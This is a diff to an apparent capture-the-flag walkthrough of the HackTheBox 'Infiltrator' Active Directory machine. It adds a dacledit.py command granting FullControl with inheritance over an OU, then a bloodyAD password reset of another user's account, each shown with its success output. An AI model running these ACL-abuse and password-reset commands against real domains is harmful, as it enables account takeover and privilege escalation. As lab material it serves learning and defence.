@@ -353,8 +353,24 @@ export KRB5CCNAME=d.anderson.ccache
 Then ill export it
 
 ```python
+dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/' -k -no-pass                      
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
+/home/kali/.local/bin/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
+  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
+[*] DACL backed up to dacledit-20261004-181019.bak
+[*] DACL modified successfully!
 ```
+
+Ill apply the inheritance rule
+
+```python
+bloodyAD --host dc01.infiltrator.htb -d infiltrator.htb -k set password 'e.rodriguez' 'Password123!'
+[+] Password changed successfully!
+```
+
+Now ill change th epas
 
 
 
